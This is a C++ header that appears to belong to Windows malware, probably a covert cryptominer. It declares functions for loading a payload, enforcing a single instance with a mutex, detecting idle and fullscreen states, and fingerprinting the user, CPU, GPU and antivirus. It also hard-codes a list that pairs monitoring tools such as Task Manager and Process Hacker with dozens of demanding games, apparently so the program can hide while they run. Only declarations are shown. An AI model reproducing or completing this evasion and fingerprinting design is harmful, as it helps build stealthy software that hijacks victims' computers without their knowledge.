#pragma once

#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <locale>
#include <unordered_map>
#include <codecvt>

BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size);
void free_buffer(BYTE* buffer);

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
);

bool IsDeviceIdle(int minutes);

bool IsForegroundWindowFullscreen();

LPWSTR StringToLPWSTR(const std::string& str);

std::string GetWindowsUsername();

int GetSystemUptimeMinutes();

wchar_t* get_file_name(wchar_t *full_path);

bool IsAnotherInstanceRunning(const char* mutexName);

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size);
bool AreProcessesRunning(const std::vector<std::string>& processNames);

// System info functions
std::string GetCPUName();
std::string GetGPUName();
std::string GetComputerHash();
std::string GetAntivirusName();
const std::vector<std::string> processNames = {
    "Taskmgr.exe", "ProcessHacker.exe", "tcpview.exe", "perfmon.exe", "procexp.exe", "procexp64.exe",
    "ModernWarfare.exe", "ShooterGame.exe", "ShooterGameServer.exe", "ShooterGame_BE.exe",
    "GenshinImpact.exe", "FactoryGame.exe", "Borderlands2.exe", "EliteDangerous64.exe",
    "PlanetCoaster.exe", "Warframe.x64.exe", "NMS.exe", "RainbowSix.exe", "RainbowSix_BE.exe",
    "CK2game.exe", "ck3.exe", "stellaris.exe", "arma3.exe", "arma3_x64.exe", "TslGame.exe",
    "ffxiv.exe", "ffxiv_dx11.exe", "GTA5.exe", "FortniteClient-Win64-Shipping.exe",
    "r5apex.exe", "VALORANT.exe", "csgo.exe", "PortalWars-Win64-Shipping.exe", "FiveM.exe",
    "left4dead2.exe", "FIFA21.exe", "BlackOpsColdWar.exe", "EscapeFromTarkov.exe",
    "TEKKEN 7.exe", "SRTTR.exe", "DeadByDaylight-Win64-Shipping.exe", "PointBlank.exe",
    "enlisted.exe", "WorldOfTanks.exe", "SoTGame.exe", "FiveM_b2189_GTAProcess.exe",
    "NarakaBladepoint.exe", "re8.exe", "Sonic Colors - Ultimate.exe", "iw6sp64_ship.exe",
    "RocketLeague.exe", "Cyberpunk2077.exe", "FiveM_GTAProcess.exe", "RustClient.exe",
    "Photoshop.exe", "VideoEditorPlus.exe", "AfterFX.exe", "League of Legends.exe",
    "Fallout4.exe", "FarCry5.exe", "RDR2.exe", "Little_Nightmares_II_Enhanced-Win64-Shipping.exe",
    "NBA2K22.exe", "Borderlands3.exe", "LeagueClientUx.exe", "RogueCompany.exe",
    "Tiger-Win64-Shipping.exe", "WatchDogsLegion.exe", "Phasmophobia.exe", "VRChat.exe",
    "NBA2K21.exe", "NarakaBladepoint.exe", "ForzaHorizon4.exe", "acad.exe",
    "AndroidEmulatorEn.exe", "bf4.exe", "zula.exe", "Adobe Premiere Pro.exe", "GenshinImpact.exe"
};
